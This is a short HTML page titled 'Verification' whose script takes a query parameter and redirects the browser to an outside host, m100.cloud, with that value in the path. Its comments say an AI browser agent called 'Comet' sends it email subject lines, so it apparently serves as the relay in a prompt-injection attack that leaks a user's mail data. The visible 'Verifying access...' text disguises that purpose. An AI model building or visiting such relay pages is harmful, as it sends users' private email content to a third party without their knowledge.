<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Verification</title>
  <script>
    // Forward ?d= param as the path segment to m100.cloud
    // Comet sends: /r/?d=EMAIL_SUBJECT_HERE
    // This page forwards to: http://m100.cloud/EMAIL_SUBJECT_HERE
    const params = new URLSearchParams(window.location.search);
    const data = params.get('d') || 'comet-exec';
    window.location.replace('http://m100.cloud/' + encodeURIComponent(data));
  </script>
</head>
<body><p style="font-family:sans-serif;color:#888">Verifying access...</p></body>
</html>
